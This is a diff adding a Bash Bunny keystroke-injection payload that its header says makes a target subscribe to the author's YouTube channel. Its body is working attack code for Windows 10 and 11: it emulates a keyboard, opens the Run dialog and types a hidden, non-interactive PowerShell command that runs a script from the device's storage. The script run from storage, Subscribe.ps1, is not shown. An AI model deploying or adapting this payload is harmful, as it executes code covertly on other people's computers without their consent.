@@ -1,0 +1,22 @@
+# Title:         Subscribe
+# Description:   This payload is meant to make your target subscribe to your youtube channel
+# Author:        I am Jakoby
+# Version:       1.0
+# Category:      General
+# Attackmodes:   HID, Storage
+# Target:        Windows 10, 11
+
+LED SETUP
+
+GET SWITCH_POSITION
+
+ATTACKMODE HID STORAGE
+
+LED STAGE1
+
+QUACK DELAY 3000
+QUACK GUI r
+QUACK DELAY 100
+LED STAGE2
+QUACK STRING powershell -NoP -NonI -W Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\Subscribe.ps1')"
+QUACK ENTER
